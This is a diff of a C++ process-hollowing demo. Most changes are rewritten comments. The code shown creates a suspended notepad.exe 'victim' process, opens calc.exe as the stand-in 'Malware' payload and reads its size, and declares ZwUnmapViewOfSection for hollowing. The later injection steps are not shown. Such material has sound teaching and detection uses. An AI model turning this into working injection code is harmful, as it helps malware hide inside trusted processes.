@@ -8,18 +8,19 @@
 #pragma comment(lib, "ntdll.lib")
 
 
-//This declaration will be used to hollow the process
+//This declaration will be used to hollow the process later in the program.
 typedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);
 
 
 int main() {
 
+	//startupInfo and processInfo structures are initialized and will be used to populate CreateProcessA() below.
 	LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
 	LPPROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
 	CONTEXT c{};
 
 
-	//Create victim process in suspended state
+	//Create victim process and primary thread in suspended state. 
 	if (CreateProcessA(
 		(LPSTR)"C:\\Windows\\System32\\notepad.exe",
 		NULL,
@@ -36,7 +37,7 @@ int main() {
 	}
 
 
-	//Pass Malware to get handle
+	//Use CreateFileA() to open Malware and retrieve location data in file system.
 	HANDLE hMalware = CreateFileA(
 		(LPCSTR)"C:\\Windows\\System32\\calc.exe",
 		GENERIC_READ,
@@ -55,7 +56,7 @@ int main() {
 	std::cout << "[+] Malware file opened." << std::endl;
 
 
-	//Retrieve size of Malware to use in VirtualAlloc().
+	//GetFileSize is used to retrieve dwSize of the Malware file.
 	DWORD malwareFileSize = GetFileSize(hMalware, 0);
 	std::cout << "[+] Malware file size: " << malwareFileSize << " bytes." << std::endl;
 
